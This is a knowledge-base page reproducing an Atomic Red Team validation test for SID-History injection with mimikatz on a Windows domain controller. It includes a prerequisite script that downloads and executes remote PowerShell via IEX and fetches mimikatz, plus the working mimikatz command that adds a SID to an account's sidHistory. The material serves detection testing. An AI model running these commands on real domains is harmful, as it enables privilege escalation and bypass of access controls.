---
atomic_guid: "6bef32e5-9456-4072-8f14-35566fb85401"
title: "Injection SID-History with mimikatz"
framework: "atomic"
generated: "true"
attack_technique_id: "T1134.005"
attack_technique_name: "Access Token Manipulation: SID-History Injection"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.005/T1134.005.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "6bef32e5-9456-4072-8f14-35566fb85401"
  - "Injection SID-History with mimikatz"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Injection SID-History with mimikatz

Adversaries may use SID-History Injection to escalate privileges and bypass access controls. Must be run on domain controller

## Metadata

- Atomic GUID: 6bef32e5-9456-4072-8f14-35566fb85401
- Technique: T1134.005: Access Token Manipulation: SID-History Injection
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1134.005/T1134.005.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1134-access_token_manipulation|T1134.005]]

## Input Arguments

### mimikatz_path

- description: Mimikatz windows executable
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe

### sam_account_name

- description: Target account to modify
- type: string
- default: $env:username

### sid_to_inject

- description: SID to inject into sidhistory
- type: string
- default: S-1-5-21-1004336348-1177238915-682003330-1134

## Dependencies

Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})

### Prerequisite Check

```text
$mimikatz_path = cmd /c echo #{mimikatz_path}
if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
```

### Get Prerequisite

```text
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
$releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
$mimikatz_exe = cmd /c echo #{mimikatz_path}
$basePath = Split-Path $mimikatz_exe | Split-Path
Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```commandprompt
#{mimikatz_path} "privilege::debug" "sid::patch" "sid::add /sid:#{sid_to_inject} /sam:#{sam_account_name}" "exit"
```

### Cleanup

```commandprompt
#{mimikatz_path} "sid::clear /sam:#{sam_account_name}" "exit"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.005/T1134.005.yaml)
